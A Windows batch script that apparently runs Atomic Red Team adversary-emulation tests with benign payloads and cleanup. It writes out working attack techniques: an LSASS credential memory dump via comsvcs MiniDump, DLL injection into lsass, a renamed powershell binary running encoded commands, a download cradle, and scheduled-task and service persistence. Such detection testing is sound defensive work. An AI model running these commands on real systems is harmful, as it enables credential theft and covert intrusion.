@echo off

echo About to perform a series of Atomic Red Team tests. Press Y to Continue, N to Exit.
choice /c YN
if %errorlevel%==2 goto no

powershell.exe -NoProfile -Command "rundll32.exe %windir%\System32\comsvcs.dll, MiniDump ((Get-Process lsass).Id) %windir%\Temp\lsass.dmp full"
TIMEOUT /T 3
dir %windir%\Temp\lsass.dmp
del %windir%\Temp\lsass.dmp

copy %windir%\System32\WindowsPowerShell\v1.0\powershell.exe %windir%\Temp\notepad.exe
%windir%\Temp\notepad.exe -e JgAgACgAZwBjAG0AIAAoACcAaQBlAHsAMAB9ACcAIAAtAGYAIAAnAHgAJwApACkAIAAoACIAVwByACIAKwAiAGkAdAAiACsAIgBlAC0ASAAiACsAIgBvAHMAdAAgACcASAAiACsAIgBlAGwAIgArACIAbABvACwAIABmAHIAIgArACIAbwBtACAAUAAiACsAIgBvAHcAIgArACIAZQByAFMAIgArACIAaAAiACsAIgBlAGwAbAAhACcAIgApAA==
TIMEOUT /T 3
del %windir%\Temp\notepad.exe

schtasks /Create /F /SC MINUTE /MO 3 /ST 07:00 /TN CMDTestTask /TR "cmd /c date /T > %windir%\Temp\current_date.txt"
TIMEOUT /T 3
schtasks /Query /TN CMDTestTask
schtasks /Delete /TN CMDTestTask /F

powershell.exe -NoProfile -Command "mavinject.exe ((Get-Process lsass).Id) /INJECTRUNNING %windir%\System32\vbscript.dll"
TIMEOUT /T 3
powershell.exe -NoProfile -Command "(ps lsass).Modules | Where-Object { $_.ModuleName -eq 'vbscript.dll' }"

powershell.exe -e  JgAgACgAZwBjAG0AIAAoACcAaQBlAHsAMAB9ACcAIAAtAGYAIAAnAHgAJwApACkAIAAoACIAVwByACIAKwAiAGkAdAAiACsAIgBlAC0ASAAiACsAIgBvAHMAdAAgACcASAAiACsAIgBlAGwAIgArACIAbABvACwAIABmAHIAIgArACIAbwBtACAAUAAiACsAIgBvAHcAIgArACIAZQByAFMAIgArACIAaAAiACsAIgBlAGwAbAAhACcAIgApAA==
TIMEOUT /T 3

%LOCALAPPDATA:~-3,1%md /c echo Hello, from CMD! > hello.txt & type hello.txt
TIMEOUT /T 3
dir hello.txt
del hello.txt

powershell -Command "(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/4042cb3433bce024e304500dcfe3c5590571573a/LICENSE.txt') | Out-File LICENSE.txt; Invoke-Item LICENSE.txt"
TIMEOUT /T 3
dir LICENSE.txt
del LICENSE.txt

rundll32.exe pcwutl.dll,LaunchApplication %windir%\System32\notepad.exe
TIMEOUT /T 3

sc create CMDTestService type=own binPath="cmd /c date /T > %windir%\Temp\current_date.txt"
TIMEOUT /T 3
sc query CMDTestService
sc delete CMDTestService

:no
echo Exiting